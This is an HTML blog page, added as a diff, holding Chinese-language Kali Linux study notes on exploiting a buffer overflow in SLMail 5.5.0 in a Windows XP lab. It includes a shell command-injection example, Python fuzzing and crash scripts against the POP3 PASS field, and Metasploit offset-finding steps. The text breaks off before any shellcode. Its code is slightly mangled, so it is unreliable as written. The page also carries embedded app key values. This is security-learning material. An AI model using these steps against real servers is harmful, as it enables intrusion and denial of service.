@@ -1,0 +1,1071 @@
+<!-- 页面预加载 <script src="//instant.page/5.1.0" type="module" integrity="sha384-by67kQnR+pyfy8yWP4kPO12fHKRLHZPfEsiSXR8u2IKcTdxD805MGUXBzVPnkLHw"></script>-->
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  
+  <title itemprop="name">❄Kali linux 学习笔记（十八）缓冲区溢出（SLMail） 2020.2.29 | flechazo</title>
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  <meta http-equiv="x-dns-prefetch-control" content="on">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+SerifMerriweather|Merriweather+Sans|Source+Code+Pro|Ubuntu:400,700|Noto+Serif+SC" media="all">
+  <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
+  <link rel="stylesheet" id="saukra_css-css" href="/css/style.css" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/lib.min.css" media="all">
+  <link rel="stylesheet" href="/css/font.css" media="all">
+  <link rel="stylesheet" href="/css/insight.css" media="all">
+  <link rel="stylesheet" href="/css/jquery.fancybox.min.css" media="all">
+  <link rel="stylesheet" href="/css/zoom.css" media="all">
+  <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<!--   <link rel="stylesheet" id="saukra_css-css" href="https://2heng.xin/wp-content/cache/autoptimize/css/autoptimize_ad42a61f4c7d4bdd9f91afcff6b5dda5.css
+" type="text/css" media="all"> -->
+  <script>
+  /*Initial Variables*/
+  var mashiro_option = new Object();
+  var mashiro_global = new Object();
+  mashiro_option.NProgressON = true;
+  /* 
+   * 邮箱信息之类的东西可以填在这里，这些js变量基本都作用于sakura-app.js
+   * 这样的设置仅是为了方便在基于PHP开发的主题中设置js变量，既然移植到了Node上，我想或许可以精简这一逻辑吧
+   */
+  mashiro_option.email_domain = "";
+  mashiro_option.email_name = "";
+  mashiro_option.cookie_version_control = "";
+  mashiro_option.qzone_autocomplete = false;
+  mashiro_option.site_name = "さらflechazoその一见钟情";
+  mashiro_option.author_name = "一见钟情";
+  mashiro_option.site_url = "/about/";
+  mashiro_option.v_appId = "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz";
+  mashiro_option.v_appKey = "mgOpfzbkHYqU92CV4IDlAUHQ";
+  mashiro_option.mathjax = "0";
+  mashiro_option.qq_api_url = "https://api.mashiro.top/qqinfo/"; 
+  mashiro_option.qq_avatar_api_url = "https://api.mashiro.top/qqinfo/";
+
+  // mashiro_option.jsdelivr_css_src = "https://cdn.jsdelivr.net/gh/moezx/cdn@3.4.5/css/lib.min.css";
+  // mashiro_option.float_player_on = true;
+
+  /*End of Initial Variables*/
+  </script>
+  <script type="text/javascript">
+  var bg = "https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/all/40.jpg,https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/all/41.jpg,https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/all/44.jpg,https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/all/4.jpg,https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/all/5.jpg,https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/all/94.jpg,https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/all/7.jpg,https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/all/8.jpg,https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/all/178.jpg,https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/all/10.jpg,https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/all/13.jpg,https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/all/12.jpg".split(",");
+  var bgindex = Math.floor(Math.random()*bg.length);
+  if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
+    alert('朋友，IE浏览器未适配哦~');
+  }
+  </script>
+  <style type="text/css">
+  .hljs-ln{border-collapse:collapse}.hljs-ln td{padding:0}.hljs-ln-n:before{content:attr(data-line-number)}
+  </style>
+  <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
+  </style>
+</head>
+</html>
+<body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
+  <div class="scrollbar" id="bar">
+  </div>
+  <a href="#" class="cd-top faa-float animated"></a>
+  <section id="main-container">
+    <div class="headertop filter-grid">
+  <div id="banner_wave_1"></div>
+  <div id="banner_wave_2"></div>
+  <figure id="centerbg" class="centerbg">
+    <div class="focusinfo no-select">
+      <div class="header-tou">
+        <a href="/about/">
+           <!--<img src="">-->
+		   
+		   <img src="https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/myimg/avatar.jpg">
+		  <!--  <img src="https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/myimg/avatar.jpg">-->
+        </a>
+      </div>
+      <div class="header-info">
+        <p>Live your life with passion! With some drive!</p>
+        <div class="top-social_v2">
+          <li id="bg-pre">
+            <img class="flipx" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+          
+            
+              
+                <li>
+                  <a href="http://github.com/Agoni37C" target="_blank" class="social-github" title="github">
+                    <img src="https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/icon/github.png">
+                  </a>
+                </li>
+              
+            
+              
+                <li>
+                  <a href="http://weibo.com/mashirozx?is_all=1" target="_blank" class="social-github" title="sina">
+                    <img src="https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/icon/sina.png">
+                  </a>
+                </li>
+              
+            
+              
+                <li>
+                  <a href="https://music.163.com/#/my/m/music/playlist?id=572492190" target="_blank" class="social-github" title="wangyiyun">
+                    <img src="https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/icon/wangyiyun.png">
+                  </a>
+                </li>
+              
+            
+              
+                <li>
+                  <a href="https://www.zhihu.com/people/xpwo-pei?is_all=1" target="_blank" class="social-github" title="zhihu">
+                    <img src="https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/icon/zhihu.png">
+                  </a>
+                </li>
+              
+            
+              
+                <li>
+                  <a href="http://weibo.com/mashirozx?is_all=1" target="_blank" class="social-github" title="email">
+                    <img src="https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/icon/email.svg">
+                  </a>
+                </li>
+              
+            
+              
+                <li class="wechat">
+                  <a href="/#">
+                    <img src="https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/icon/wechat.png">
+                  </a>
+                  <div class="wechatInner">
+                    <img src="https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/myimg/WeChat.jpg">
+                  </div>
+                </li>
+              
+            
+              
+                <li class="wechat">
+                  <a href="/#">
+                    <img src="https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/icon/wechat.png">
+                  </a>
+                  <div class="wechatInner">
+                    <img src="https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/myimg/WeChatHao.jpg">
+                  </div>
+                </li>
+              
+            
+          
+          <li id="bg-next">
+            <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+        </div>
+      </div>
+    </div>
+  </figure>
+  <div id="video-container" style="">
+    <video style="object-fit: fill" id="bgvideo" class="video" video-name="" src="" width="auto" preload="auto">
+    </video>
+    <div id="video-btn" class="loadvideo videolive">
+    </div>
+    <div id="video-add">
+    </div>
+    <div class="video-stu">
+    </div>
+  </div>
+  <div class="headertop-down faa-float animated" onclick="headertop_down()">
+    <span>
+      <i class="fa fa-chevron-down" aria-hidden="true">
+      </i>
+    </span>
+  </div>
+</div>
+    <div id="page" class="site wrapper">
+      <header class="site-header no-select gizle sabit" role="banner">
+  <div class="site-top">
+    <div class="site-branding">
+      <span class="site-title">
+        <span class="logolink moe-mashiro">
+          <a href="/">
+            <span class="sakurasono">さらflechazoその</span>
+            <span class="shironeko">一见钟情</span>
+          </a>
+        </span>
+      </span>
+    </div>
+    <div class="searchbox search-form-submit">
+      <i class="iconfont js-toggle-search iconsearch icon-search">
+      </i>
+    </div>
+    <div id="show-nav" class="showNav mobile-fit">
+      <div class="line line1">
+      </div>
+      <div class="line line2">
+      </div>
+      <div class="line line3">
+      </div>
+    </div>
+    <div class="lower-cantiner">
+      <div class="lower">
+        <nav class="mobile-fit-control hide">
+          <ul id="menu-new" class="menu">
+            
+              <li>
+                <a href="/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+                    首页
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
+                    归档
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/categories/技术/">
+                          <i class="fa fa-code" aria-hidden="true"></i>
+                          技术
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/生活/">
+                          <i class="fa fa-file-text-o" aria-hidden="true"></i>
+                          生活
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="https://www.yutu.cn/popsoft_1_2.html">
+                          <i class="fa fa-cloud-download" aria-hidden="true"></i>
+                          资源
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/随想/">
+                          <i class="fa fa-commenting-o" aria-hidden="true"></i>
+                          随想
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/转载/">
+                          <i class="fa fa-book" aria-hidden="true"></i>
+                          转载
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="javascript:;">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+                    清单
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/tags/美文/">
+                          <i class="fa fa-gift" aria-hidden="true"></i>
+                          美文
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/music/">
+                          <i class="fa fa-headphones" aria-hidden="true"></i>
+                          歌单
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/photos/">
+                          <i class="fa fa-photo" aria-hidden="true"></i>
+                          图集
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/bangumi/">
+                          <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
+                          番组
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/tags/视频/">
+                          <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
+                          视频
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/tags/收藏/">
+                          <i class="fa fa-laptop" aria-hidden="true"></i>
+                          收藏
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/star/">
+                          <i class="fa fa-gratipay" aria-hidden="true"></i>
+                          追星
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/drama/">
+                          <i class="fa fa-tripadvisor" aria-hidden="true"></i>
+                          追剧
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="/tags/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-tag" aria-hidden="true"></i>
+                    标签
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/categories/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-bookmark" aria-hidden="true"></i>
+                    分类
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/comment/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
+                    留言板
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
+                    关于
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/about/">
+                          <i class="fa fa-meetup" aria-hidden="true"></i>
+                          我？
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/theme-sakura/">
+                          <i class="fa iconfont icon-sakura" aria-hidden="true"></i>
+                          主题
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/donate/">
+                          <i class="fa fa-heart faa-pulse" aria-hidden="true"></i>
+                          赞赏
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/links/">
+                          <i class="fa fa-link faa-shake" aria-hidden="true"></i>
+                          友人
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/lab/">
+                          <i class="fa fa-cogs" aria-hidden="true"></i>
+                          Lab
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/my/log in/">
+                          <i class="fa fa-user-o" aria-hidden="true"></i>
+                          login
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="javascript:;">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+                    杂
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/lab/">
+                          <i class="fa fa-cogs" aria-hidden="true"></i>
+                          网站
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/my/site muban/">
+                          <i class="fa fa-user-o" aria-hidden="true"></i>
+                          模板
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/atom.xml">
+                          <i class="fa fa-rss faa-pulse" aria-hidden="true"></i>
+                          RSS
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+          </ul>
+        </nav>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/all/118.jpg);" src="https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/myimg/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/all/118.jpg">
+    </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      ❄Kali linux 学习笔记（十八）缓冲区溢出（SLMail） 2020.2.29</h1>
+      <p class="entry-census">
+        <span>
+          <a href="">
+            <img src="https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/myimg/avatar.jpg">
+          </a>
+        </span>
+        <span>
+          <a href="">flechazo</a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2020-2-29<span class="bull">
+        ·</span>
+      <span id="busuanzi_value_page_pv"></span>次阅读</p>
+    </header>
+  </div>
+
+<div id="content" class="site-content">
+  <div id="primary" class="content-area">
+    <main id="main" class="site-main" role="main">
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+        <div class="entry-content">
+          <article class="baidu_pl"><br>        <div id="article_content" class="article_content clearfix"><br>        <link rel="stylesheet" href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/ck_htmledit_views-b5506197d8.css"><br>                <div id="content_views" class="markdown_views prism-atom-one-light"><br>                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><br/>                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"/><br/>                    </svg><br>                    <h1><a name="t0"></a><a name="t0"></a><a id="_0"></a>前言</h1><br><p>前几天在学漏洞扫描<br> 主要就是openvas和nessus的运用<br> 就没有写笔记<br> 可以参考</p><br><pre class="prettyprint"><code class="prism language-bash has-numbering" onclick="mdcp.signin(event)" style="position: unset;"><a href="https://blog.csdn.net/Kevinhanser/article/details/79506904" target="_blank" rel="noopener">https://blog.csdn.net/Kevinhanser/article/details/79506904</a><br><a href="https://blog.csdn.net/weixin_34241036/article/details/93187026" target="_blank" rel="noopener">https://blog.csdn.net/weixin_34241036/article/details/93187026</a><br><a href="https://blog.csdn.net/wwl012345/article/details/96998187?ops_request_misc" target="_blank" rel="noopener">https://blog.csdn.net/wwl012345/article/details/96998187?ops_request_misc</a><span class="token operator">=</span>%7B%22request%5Fid%22%3A%22158314087819725256756581%22%2C%22scm%22%3A%2220140713.130056874<span class="token punctuation">..</span>%22%7D<span class="token operator">&amp;</span>request_id<span class="token operator">=</span>158314087819725256756581<span class="token operator">&amp;</span>biz_id<span class="token operator">=</span>0<span class="token operator">&amp;</span>utm_source<span class="token operator">=</span>distribute.pc_search_result.none-task<div class="hljs-button signin" data-title="登录后复制" data-report-click="{"spm":"1001.2101.3001.4259"}"></div></code></pre><ul class="pre-numbering" style="opacity: 0.370293;"><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li></ul><br><p>之前一直都是扫描发现漏洞<br> 现在开始，学习利用漏洞进行攻防</p><br><p>程序漏洞来源在于</p><br><ul><li>变量是根源</li><li>数据和代码边界不清</li></ul><br><p>一个简单的例子<br> 最简漏洞原理——shell脚本漏洞</p><br><pre class="prettyprint"><code class="prism language-bash has-numbering" onclick="mdcp.signin(event)" style="position: unset;">ld.sh<br><span class="token comment">#!/bin/bash</span><br><span class="token keyword">echo</span> <span class="token operator">&amp;</span>1<br><span class="token comment">#显然就是个显示字符的脚本</span><br><span class="token comment">#如果输入一个系统命令，并不会执行</span><br><span class="token comment">#如果在系统命令前加入”;”，系统命令被执行</span><br><span class="token comment">#如./ld.sh ;pwd</span><div class="hljs-button signin" data-title="登录后复制" data-report-click="{"spm":"1001.2101.3001.4259"}"></div></code></pre><ul class="pre-numbering" style="opacity: 0.370293;"><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li></ul><br><p>缓冲区溢出就是种简单的可以</p><br><h2><a name="t1"></a><a name="t1"></a><a id="1_32"></a>1、缓冲区溢出简介</h2><br><p>当缓冲区边界限制不严格时<br> 由于变量传入畸形数据或程序运行错误<br> 导致缓冲区被“撑爆”，覆盖相邻内存区域的数据<br> 然后可以</p><br><ul><li>修改内存数据</li><li>造成进程劫持</li><li>执行恶意代码</li><li>获取服务器控制器</li></ul><br><p>发现漏洞的方法：</p><br><ul><li>源码审计</li><li>逆向工程</li><li>模糊测试<br>  <ul><li>向程序堆栈半随机数据，根据内存变化判断溢出</li><li>数据生成器：生成随机、半随机数据</li><li>测试工具：识别溢出漏洞</li></ul> </li><li>对未知协议，可以查RFC或用wireshark抓包</li></ul><br><h2><a name="t2"></a><a name="t2"></a><a id="2SLMail_53"></a>2、以SLMail为例完成一次缓冲区溢出</h2><br><h4><a id="_54"></a>实验准备</h4><br><p>目标主机：windows xp（win7以上修复了相关漏洞）注意win的25和110端口要打开<br> 所需程序：SLMail 5.5.0 Mail Server、ImmunityDebugger_1_85_setup.exe、mona.py</p><br><p>原理：<br> 用kali向win的SLMail进行攻击<br> nc 连接 110端口<br> 输入<br> USER test<br> PASS aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<br> #PASS传输足够大的数据，就会缓冲区溢出，覆盖相邻内存<br> 然后通过在溢出的内存上放置shellcode来实现攻击</p><br><p>下面一步步来</p><br><h4><a id="_69"></a>实现连接</h4><br><p>脚本01.py实现连接和发送指令</p><br><pre class="prettyprint"><code class="prism language-bash has-numbering" onclick="mdcp.signin(event)" style="position: unset;"><span class="token comment">#!/usr/bin/python</span><br><span class="token function">import</span> socket<br>s<span class="token operator">=</span>socket.socket<span class="token punctuation">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="token punctuation">)</span><br>try:<br> print<span class="token punctuation">(</span><span class="token string">“\nSending evil buffer…”</span><span class="token punctuation">)</span><br> s.connect<span class="token punctuation">((</span><span class="token string">‘192.168.1.119’</span>,110<span class="token punctuation">)</span> <span class="token comment">#连接SLMail</span><br> data<span class="token operator">=</span>s.recv<span class="token punctuation">(</span>1024<span class="token punctuation">)</span><br> print<span class="token punctuation">(</span>data<span class="token punctuation">)</span><br> s.send<span class="token punctuation">(</span><span class="token string">‘USER test’</span>+<span class="token string">‘\r\n’</span><span class="token punctuation">)</span><br> data<span class="token operator">=</span>s.recv<span class="token punctuation">(</span>1024<span class="token punctuation">)</span><br> print<span class="token punctuation">(</span>data<span class="token punctuation">)</span><br> s.send<span class="token punctuation">(</span><span class="token string">‘PASS test\r\n’</span><span class="token punctuation">)</span><br> data<span class="token operator">=</span>s.recv<span class="token punctuation">(</span>1024<span class="token punctuation">)</span><br> print<span class="token punctuation">(</span>data<span class="token punctuation">)</span><br> s.close<span class="token punctuation">(</span><span class="token punctuation">)</span><br> print<span class="token punctuation">(</span><span class="token string">“\nDone”</span><span class="token punctuation">)</span><br>except:<br> print<span class="token punctuation">(</span><span class="token string">“Could not connect to POP3”</span><span class="token punctuation">)</span><div class="hljs-button signin" data-title="登录后复制" data-report-click="{"spm":"1001.2101.3001.4259"}"></div></code></pre><ul class="pre-numbering" style="opacity: 0.370293;"><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li><li style="color: rgb(153, 153, 153);">9</li><li style="color: rgb(153, 153, 153);">10</li><li style="color: rgb(153, 153, 153);">11</li><li style="color: rgb(153, 153, 153);">12</li><li style="color: rgb(153, 153, 153);">13</li><li style="color: rgb(153, 153, 153);">14</li><li style="color: rgb(153, 153, 153);">15</li><li style="color: rgb(153, 153, 153);">16</li><li style="color: rgb(153, 153, 153);">17</li></ul><br><h4><a id="_92"></a>模糊测试</h4><br><p>发送大量数据看是否会溢出<br> 脚本02.py不断增大数据并确定临界</p><br><pre class="prettyprint"><code class="prism language-bash has-numbering" onclick="mdcp.signin(event)" style="position: unset;"><span class="token comment">#!/usr/bin/python</span><br><span class="token function">import</span> socket<br>buffer<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">“A”</span><span class="token punctuation">]</span><br>counter<span class="token operator">=</span>100<br><span class="token keyword">while</span> len<span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token operator">&lt;=</span>30:<br> buffer.append<span class="token punctuation">(</span><span class="token string">“A”</span><em>counter<span class="token punctuation">)</span><br> counter+<span class="token operator">=</span>200<br><span class="token keyword">for</span> string <span class="token keyword">in</span> buffer:<br> print<span class="token punctuation">(</span><span class="token string">“\nSending evil buffer…”</span><span class="token punctuation">)</span><br> s<span class="token operator">=</span>socket.socket<span class="token punctuation">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="token punctuation">)</span><br> s.connect<span class="token punctuation">((</span><span class="token string">‘192.168.1.119’</span>,110<span class="token punctuation">)</span> <span class="token comment">#连接SLMail</span><br> data<span class="token operator">=</span>s.recv<span class="token punctuation">(</span>1024<span class="token punctuation">)</span><br> s.send<span class="token punctuation">(</span><span class="token string">‘USER test’</span>+<span class="token string">‘\r\n’</span><span class="token punctuation">)</span><br> data<span class="token operator">=</span>s.recv<span class="token punctuation">(</span>1024<span class="token punctuation">)</span><br> s.send<span class="token punctuation">(</span><span class="token string">‘PASS’</span>+buffer+<span class="token string">‘\r\n’</span><span class="token punctuation">)</span><br> s.send<span class="token punctuation">(</span><span class="token string">‘QUIT\r\n’</span><span class="token punctuation">)</span><br> s.close<span class="token punctuation">(</span><span class="token punctuation">)</span><div class="hljs-button signin" data-title="登录后复制" data-report-click="{"spm":"1001.2101.3001.4259"}"></div></em></code></pre><ul class="pre-numbering" style="opacity: 0.370293;"><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li><li style="color: rgb(153, 153, 153);">9</li><li style="color: rgb(153, 153, 153);">10</li><li style="color: rgb(153, 153, 153);">11</li><li style="color: rgb(153, 153, 153);">12</li><li style="color: rgb(153, 153, 153);">13</li><li style="color: rgb(153, 153, 153);">14</li><li style="color: rgb(153, 153, 153);">15</li><li style="color: rgb(153, 153, 153);">16</li></ul><br><p>发现2700个左右会发生溢出</p><br><h4><a id="_116"></a>定位边界</h4><br><p>ImmunityDebugger<br> 可以对exe进行汇编调试<br> 也可以对进程attach进行调试<br> 对110端口的进程进行调试<br> 关注寄存器EIP（存放下一条指令地址），会被覆盖</p><br><p>kali执行</p><br><pre class="prettyprint"><code class="prism language-bash has-numbering" onclick="mdcp.signin(event)" style="position: unset;">/usr/share/metasploit-framework/tools/<br>./pattern_create.rb 2700<div class="hljs-button signin" data-title="登录后复制" data-report-click="{"spm":"1001.2101.3001.4259"}"></div></code></pre><ul class="pre-numbering" style="opacity: 0.370293;"><li style="color: rgb(153, 153, 153);">1</li></ul><br><p>生成2700个唯一字符串设为str</p><br><p>脚本03.py定位溢出临界</p><br><pre class="prettyprint"><code class="prism language-bash has-numbering" onclick="mdcp.signin(event)" style="position: unset;"><span class="token comment">#!/usr/bin/python</span><br><span class="token function">import</span> socket<br>buffer<span class="token operator">=</span>str <span class="token comment">#上面生成的字符串str</span><br>try:<br> print<span class="token punctuation">(</span><span class="token string">“Fuzzing PASSwith %s bytes”</span> %len<span class="token punctuation">(</span>string<span class="token punctuation">))</span><br> s<span class="token operator">=</span>socket.socket<span class="token punctuation">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="token punctuation">)</span><br> s.connect<span class="token punctuation">((</span><span class="token string">‘192.168.1.119’</span>,110<span class="token punctuation">)</span> <span class="token comment">#连接SLMail</span><br> s.recv<span class="token punctuation">(</span>1024<span class="token punctuation">)</span><br> s.send<span class="token punctuation">(</span><span class="token string">‘USER test’</span>+<span class="token string">‘\r\n’</span><span class="token punctuation">)</span><br> s.recv<span class="token punctuation">(</span>1024<span class="token punctuation">)</span><br> s.send<span class="token punctuation">(</span><span class="token string">‘PASS’</span>+string+<span class="token string">‘\r\n’</span><span class="token punctuation">)</span><br> s.close<span class="token punctuation">(</span><span class="token punctuation">)</span><br> print<span class="token punctuation">(</span><span class="token string">“\nDone”</span><span class="token punctuation">)</span><br>except:<br> print<span class="token punctuation">(</span><span class="token string">“Could not connect to POP3”</span><span class="token punctuation">)</span><br><div class="hljs-button signin" data-title="登录后复制" data-report-click="{"spm":"1001.2101.3001.4259"}"></div></code></pre><ul class="pre-numbering" style="opacity: 0.370293;"><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li><li style="color: rgb(153, 153, 153);">9</li><li style="color: rgb(153, 153, 153);">10</li><li style="color: rgb(153, 153, 153);">11</li><li style="color: rgb(153, 153, 153);">12</li><li style="color: rgb(153, 153, 153);">13</li><li style="color: rgb(153, 153, 153);">14</li><li style="color: rgb(153, 153, 153);">15</li></ul><br><p>然后根据EIP的内容可以定位溢出字符<br> 例EIP 39694438</p><br><pre class="prettyprint"><code class="prism language-bash has-numbering" onclick="mdcp.signin(event)" style="position: unset;">./pattern_offset.rb 39694438 <span class="token comment">#定位成功2606</span><div class="hljs-button signin" data-title="登录后复制" data-report-click="{"spm":"1001.2101.3001.4259"}"></div></code></pre><ul class="pre-numbering" style="opacity: 0.370293;"></ul><br><p>注意内存内容左右反的</p><br><h4><a id="_164"></a>探寻存放空间</h4><br><p>因为已经实现可以精确修改EIP和ESP的内容<br> 现在探寻ESP空间是否足够大，可以放shellcode<br> 如果可行，把shellcode写入ESP<br> 把ESP的地址写入EIP<br> 这样系统读取EIP会执行shellcode</p><br><p>脚本04.py探寻ESP空间</p><br><pre class="prettyprint"><code 